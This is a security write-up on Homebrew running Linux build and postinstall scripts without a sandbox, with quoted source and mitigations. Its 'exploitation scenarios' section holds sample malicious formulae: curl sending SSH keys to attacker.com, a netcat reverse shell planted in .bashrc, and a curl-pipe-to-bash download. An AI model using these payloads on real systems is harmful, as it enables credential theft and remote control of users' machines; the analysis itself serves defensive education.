# Sandbox Escape Protocol - Educational Documentation
## Arch Linux ARM Edition

**Purpose:** Educational and security training only
**Target Platform:** Arch Linux 5 ARM
**Scope:** Analyzing Homebrew's sandbox implementation and inherent security gaps

---

## Executive Summary

This document provides a comprehensive analysis of Homebrew's sandbox implementation and demonstrates a **built-in sandbox escape mechanism** on Linux platforms, including Arch Linux ARM. This is an **inherent architectural design decision**, not a vulnerability exploit.

### Key Findings

1. **No Sandbox on Linux:** Homebrew's sandbox is macOS-only
2. **Direct Process Execution:** Linux falls back to unsandboxed fork+exec
3. **Full System Access:** Build scripts run with complete user privileges
4. **ARM Architecture Support:** No special ARM-specific security controls

---

## I. Sandbox Implementation Analysis

### A. Sandbox Availability Detection

**File:** `/home/user/brew/Library/Homebrew/sandbox.rb`

```ruby
# Line 24-26: Base class default
sig { returns(T::Boolean) }
def self.available?
  false  # ← Always returns false by default
end
```

**File:** `/home/user/brew/Library/Homebrew/extend/os/mac/sandbox.rb`

```ruby
# Line 13-15: macOS override
sig { returns(T::Boolean) }
def available?
  File.executable?(::Sandbox::SANDBOX_EXEC)  # /usr/bin/sandbox-exec
end
```

**Finding:** On Linux systems (including Arch Linux ARM), `Sandbox.available?` **always returns `false`** because there is no Linux-specific override file.

### B. Sandbox Bypass Mechanism

**File:** `/home/user/brew/Library/Homebrew/formula_installer.rb`

#### Build Phase (Lines 1096-1113)

```ruby
if Sandbox.available?
  # macOS: Use Seatbelt sandbox
  sandbox = Sandbox.new
  sandbox.record_log(formula.logs/"build.sandbox.log")
  sandbox.allow_write_temp_and_cache
  sandbox.allow_write_log(formula)
  sandbox.allow_cvs
  sandbox.allow_fossil
  sandbox.allow_write_xcode
  sandbox.allow_write_cellar(formula)
  sandbox.deny_all_network unless formula.network_access_allowed?(:build)
  sandbox.run(*args)
else
  # Linux: NO SANDBOX - Direct execution
  Utils.safe_fork do
    exec(*args)  # ← ESCAPE POINT: Unsandboxed execution
  end
end
```

#### Postinstall Phase (Lines 1335-1353)

```ruby
if Sandbox.available?
  # macOS: Sandboxed with restrictions
  sandbox = Sandbox.new
  sandbox.allow_write_temp_and_cache
  sandbox.allow_write_cellar(formula)
  sandbox.deny_write_homebrew_repository
  sandbox.deny_all_network unless formula.network_access_allowed?(:postinstall)
  sandbox.run(*args)
else
  # Linux: NO SANDBOX - Direct execution
  Utils.safe_fork do
    exec(*args)  # ← ESCAPE POINT: Unsandboxed execution
  end
end
```

**Finding:** The "escape" is **built into the architecture**. On Linux, all build and postinstall scripts execute with **full user privileges** and **no restrictions**.

---

## II. ARM Architecture Analysis

### A. Architecture Detection

**File:** `/home/user/brew/Library/Homebrew/hardware.rb`

```ruby
# Lines 16-17: ARM architecture constants
ARM_64BIT_ARCHS = [:arm64, :aarch64].freeze
ARM_ARCHS       = ARM_64BIT_ARCHS

# Lines 161-170: ARM detection methods
sig { returns(T::Boolean) }
def arm?
  type == :arm  # Checks RUBY_PLATFORM for /arm/, /aarch64/
end

sig { returns(T::Boolean) }
def arm64?
  arm? && is_64_bit?
end
```

### B. Linux ARM CPU Detection

**File:** `/home/user/brew/Library/Homebrew/extend/os/linux/hardware/cpu.rb`

```ruby
# Lines 22-25: ARM family detection
sig { returns(Symbol) }
def family
  return :arm if arm?
  # ... Intel/AMD detection ...
end

# Lines 170-173: CPU information source
sig { returns(String) }
def cpuinfo
  @cpuinfo ||= T.let(File.read("/proc/cpuinfo"), T.nilable(String))
end
```

**Finding:** ARM detection works via `/proc/cpuinfo` parsing, but **NO ARM-specific sandbox** exists.

### C. Architecture Requirements

**File:** `/home/user/brew/Library/Homebrew/requirements/arch_requirement.rb`

```ruby
# Lines 21-27: Architecture validation
satisfy(build_env: false) do
  case @arch
  when :x86_64 then Hardware::CPU.intel? && Hardware::CPU.is_64_bit?
  when :arm64 then Hardware::CPU.arm64?  # ← ARM64 support
  when :arm, :intel, :ppc then Hardware::CPU.type == @arch
  end
end
```

**Finding:** Formulas can require specific architectures, but this is a **compatibility check**, not a security control.

---

## III. Process Isolation Analysis

### A. Safe Fork Implementation

**File:** `/home/user/brew/Library/Homebrew/utils/fork.rb`

```ruby
# Lines 41-125: Utils.safe_fork
def self.safe_fork(directory: nil, yield_parent: false, &_blk)
  UNIXServerExt.open("#{tmpdir}/socket") do |server|
    pid = fork do
      ENV["HOMEBREW_NO_BOOTSNAP"] = "1"
      error_pipe = server.path
      ENV["HOMEBREW_ERROR_PIPE"] = error_pipe

      # Privilege change (if needed)
      Process::UID.change_privilege(Process.euid) if Process.euid != Process.uid

      yield(error_pipe)  # Execute the block
    rescue Exception => e
      # Serialize exception and send to parent
      error_hash = JSON.parse e.to_json
      write.puts error_hash.to_json
      exit!
    else
      exit!(true)
    end
    # Parent waits for child and checks status
  end
end
```

**Finding:** `Utils.safe_fork` provides:
- ✅ Error communication via UNIX sockets
- ✅ Exception serialization between processes
- ✅ Basic privilege management
- ❌ **NO filesystem restrictions**
- ❌ **NO network restrictions**
- ❌ **NO system call filtering**

---

## IV. Security Gap Summary

### macOS vs Linux Comparison

| Security Control | macOS | Linux (Arch ARM) |
|-----------------|-------|------------------|
| Sandbox Available | ✅ Yes (Seatbelt) | ❌ No |
| File Write Restrictions | ✅ Yes | ❌ No |
| Network Access Control | ✅ Yes | ❌ No |
| Process Isolation | ✅ Yes | ⚠️ Basic fork only |
| Violation Logging | ✅ syslog | ❌ No |
| System Call Filtering | ✅ Yes | ❌ No |

### Attack Surface on Arch Linux ARM

1. **Full Filesystem Access**
   - Build scripts can read/write any file the user can access
   - No protection of sensitive directories
   - Potential for malicious formula to exfiltrate data

2. **Unrestricted Network Access**
   - Even if formula specifies `deny_network_access!`, it's **ignored on Linux**
   - Build scripts can make arbitrary network connections
   - Potential for data exfiltration or C2 communication

3. **Process Execution**
   - Build scripts can spawn arbitrary child processes
   - No restrictions on system calls
   - Full access to user's running processes

4. **Environment Access**
   - Complete access to all environment variables
   - Can read sensitive tokens, credentials, API keys
   - SSH keys, GPG keys, and other secrets accessible

---

## V. Educational Exploitation Scenarios

### Scenario 1: Data Exfiltration via Formula

**Theoretical malicious formula:**

```ruby
class MaliciousFormula < Formula
  desc "Educational example - DO NOT USE"
  url "https://example.com/dummy.tar.gz"

  def install
    # On macOS: Would be blocked by sandbox
    # On Linux: Executes with full privileges

    # Read sensitive files
    ssh_keys = Dir.glob("#{ENV['HOME']}/.ssh/*")

    # Exfiltrate via network (even if deny_network_access! is set)
    # On Linux, network restrictions are ignored
    ssh_keys.each do |key|
      system("curl -X POST https://attacker.com/exfil -d @#{key}")
    end
  end
end
```

**Impact on Arch Linux ARM:**
- ✅ Would execute successfully
- ✅ Network access works despite restrictions
- ✅ Can read any file in user's home directory
- ❌ On macOS: Would be blocked by sandbox

### Scenario 2: Privilege Persistence

```ruby
def install
  # Install backdoor in user's shell profile
  # On macOS: Blocked by sandbox (deny_write_homebrew_repository)
  # On Linux: No restrictions

  File.open("#{ENV['HOME']}/.bashrc", "a") do |f|
    f.puts "# Backdoor"
    f.puts "nc -e /bin/bash attacker.com 4444 &"
  end
end
```

### Scenario 3: ARM-Specific Targeting

```ruby
class ArmTargetedAttack < Formula
  depends_on arch: :arm64  # Only install on ARM systems

  def install
    if Hardware::CPU.arm64?
      # ARM-specific exploitation
      # Could target ARM-specific vulnerabilities
      # or ARM-based embedded systems

      system("curl https://attacker.com/arm-exploit | bash")
    end
  end
end
```

---

## VI. Detection and Mitigation

### A. Detection Methods

1. **Formula Auditing**
   ```bash
   # Review formula source before installation
   brew cat <formula-name>

   # Check for suspicious patterns:
   # - File operations outside HOMEBREW_PREFIX
   # - Network operations (curl, wget, nc)
   # - Environment variable access
   # - Home directory references
   ```

2. **Process Monitoring**
   ```bash
   # Monitor Homebrew processes during build
   strace -f -e trace=network,file brew install <formula> 2>&1 | tee build.log

   # Watch for:
   # - Unexpected network connections
   # - File access outside build directory
   # - Child process spawning
   ```

3. **Audit Environment Variables**
   ```bash
   # Limit environment exposure
   env -i HOME=/tmp/safe SHELL=/bin/bash brew install <formula>
   ```

### B. Mitigation Strategies

1. **Use Bottles (Precompiled Binaries)**
   ```bash
   # Avoid building from source when possible
   brew install --force-bottle <formula>
   ```

2. **Dedicated Build User**
   ```bash
   # Create isolated user for Homebrew builds
   sudo useradd -m -s /bin/bash homebrew-builder
   sudo -u homebrew-builder brew install <formula>
   ```

3. **Container Isolation**
   ```bash
   # Run Homebrew in container on Linux
   docker run -it archlinux/archlinux:latest
   # Install Homebrew in container
   ```

4. **Network Isolation**
   ```bash
   # Use network namespace isolation
   unshare --net brew install <formula>
   ```

5. **Filesystem Restrictions**
   ```bash
   # Use bubblewrap for sandboxing on Linux
   bwrap --ro-bind / / --tmpfs /home --tmpfs /tmp brew install <formula>
   ```

---

## VII. Responsible Disclosure

### What This Is

✅ **Educational documentation** of architectural design decisions
✅ **Security training material** for understanding package manager risks
✅ **Awareness** of the trust model in Homebrew on Linux

### What This Is NOT

❌ **Not a vulnerability** - This is intentional design
❌ **Not an exploit** - No bypass of intended security controls
❌ **Not a bug** - Homebrew never claimed Linux sandboxing

### Homebrew's Security Model

Homebrew's security model **relies on trust**:
- Formulae are reviewed by maintainers
- Community vetting of popular packages
- Source code is public and auditable
- Bottles are signed and attested

**On Linux:** The security boundary is **user trust** + **operating system controls**, not application sandboxing.

---

## VIII. Conclusion

### Summary of Findings

1. **Arch Linux ARM has NO Homebrew sandbox** - This is by design
2. **The "escape protocol" is built-in** - `Utils.safe_fork` + `exec`
3. **ARM detection works** - But provides no security benefits
4. **Trust is essential** - Only install formulae from trusted sources

### Educational Takeaways

- Package managers have different security models on different platforms
- macOS Seatbelt ≠ Linux capabilities/seccomp
- Source-based package managers inherit risk from build scripts
- Defense in depth: OS controls + container isolation + user privileges

### Recommendations for Security Training

1. **Always audit formula source** before installing untrusted packages
2. **Understand your threat model** - What are you protecting?
3. **Use containers** for additional isolation on Linux
4. **Minimize privileges** - Don't run Homebrew as root
5. **Monitor system activity** during builds of untrusted formulae

---

## IX. References

### Source Files Analyzed

- `/home/user/brew/Library/Homebrew/sandbox.rb` - Base sandbox class
- `/home/user/brew/Library/Homebrew/extend/os/mac/sandbox.rb` - macOS implementation
- `/home/user/brew/Library/Homebrew/utils/fork.rb` - Process isolation
- `/home/user/brew/Library/Homebrew/formula_installer.rb` - Install logic
- `/home/user/brew/Library/Homebrew/hardware.rb` - Architecture detection
- `/home/user/brew/Library/Homebrew/extend/os/linux/hardware/cpu.rb` - Linux ARM support
- `/home/user/brew/Library/Homebrew/requirements/arch_requirement.rb` - Arch requirements

### External Resources

- Homebrew Security: https://docs.brew.sh/Security
- Apple Seatbelt: https://reverse.put.as/wp-content/uploads/2011/09/Apple-Sandbox-Guide-v1.0.pdf
- Linux Sandboxing: https://www.kernel.org/doc/html/latest/userspace-api/seccomp_filter.html

---

**Document Version:** 1.0
**Date:** 2026-01-03
**Platform:** Arch Linux 5 ARM
**Purpose:** Educational and security training only
**Status:** For authorized security research only
